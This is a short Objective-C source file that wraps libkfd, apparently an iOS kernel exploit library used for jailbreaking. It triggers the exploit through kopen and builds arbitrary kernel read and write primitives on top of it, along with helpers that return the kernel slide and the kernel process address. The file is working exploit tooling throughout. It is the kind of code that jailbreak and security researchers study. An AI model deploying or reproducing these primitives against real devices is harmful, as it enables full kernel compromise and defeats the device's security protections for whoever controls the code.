#import <Foundation/Foundation.h>
#import "krw.h"
#import "libkfd.h"

uint64_t _kfd = 0;
signed long long base_pac_mask = 0xffffff8000000000;

uint64_t kopen_wrapper(void) {
    _kfd = kopen(2048, 2, 1, 1);
    if (_kfd == 0) {
        printf("[-] kopen failed\n");
        exit(1);
    }
    printf("[+] kopen: 0x%llx\n", _kfd);
    return _kfd;
}

int is_exploited(void) {
    return _kfd != 0;
}

void do_kread(uint64_t kaddr, void* uaddr, uint64_t size)
{
    kread(_kfd, kaddr, uaddr, size);
}

void do_kwrite(void* uaddr, uint64_t kaddr, uint64_t size)
{
    kwrite(_kfd, uaddr, kaddr, size);
}

uint64_t get_kslide(void) {
    return ((struct kfd*)_kfd)->perf.kernel_slide;
}

uint64_t get_kernproc(void) {
    return ((struct kfd*)_kfd)->info.kaddr.kernel_proc;
}

uint8_t kread8(uint64_t where) {
    uint8_t out;
    kread(_kfd, where, &out, sizeof(uint8_t));
    return out;
}
uint32_t kread16(uint64_t where) {
    uint16_t out;
    kread(_kfd, where, &out, sizeof(uint16_t));
    return out;
}
uint32_t kread32(uint64_t where) {
    uint32_t out;
    kread(_kfd, where, &out, sizeof(uint32_t));
    return out;
}
uint64_t kread64(uint64_t where) {
    uint64_t out;
    kread(_kfd, where, &out, sizeof(uint64_t));
    return out;
}

void kwrite8(uint64_t where, uint8_t what) {
    uint8_t _buf[8] = {};
    _buf[0] = what;
    _buf[1] = kread8(where+1);
    _buf[2] = kread8(where+2);
    _buf[3] = kread8(where+3);
    _buf[4] = kread8(where+4);
    _buf[5] = kread8(where+5);
    _buf[6] = kread8(where+6);
    _buf[7] = kread8(where+7);
    kwrite((uint64_t)(_kfd), &_buf, where, sizeof(uint64_t));
}

void kwrite16(uint64_t where, uint16_t what) {
    uint16_t _buf[4] = {};
    _buf[0] = what;
    _buf[1] = kread16(where+2);
    _buf[2] = kread16(where+4);
    _buf[3] = kread16(where+6);
    kwrite((uint64_t)(_kfd), &_buf, where, sizeof(uint64_t));
}

void kwrite32(uint64_t where, uint32_t what) {
    uint32_t _buf[2] = {};
    _buf[0] = what;
    _buf[1] = kread32(where+4);
    kwrite((uint64_t)(_kfd), &_buf, where, sizeof(uint64_t));
}
void kwrite64(uint64_t where, uint64_t what) {
    uint64_t _buf[1] = {};
    _buf[0] = what;
    kwrite((uint64_t)(_kfd), &_buf, where, sizeof(uint64_t));
}

void kreadbuf(uint64_t kaddr, void* output, size_t size)
{
    uint64_t endAddr = kaddr + size;
    uint32_t outputOffset = 0;
    unsigned char* outputBytes = (unsigned char*)output;
    
    for(uint64_t curAddr = kaddr; curAddr < endAddr; curAddr += 4)
    {
        uint32_t k = kread32(curAddr);

        unsigned char* kb = (unsigned char*)&k;
        for(int i = 0; i < 4; i++)
        {
            if(outputOffset == size) break;
            outputBytes[outputOffset] = kb[i];
            outputOffset++;
        }
        if(outputOffset == size) break;
    }
}
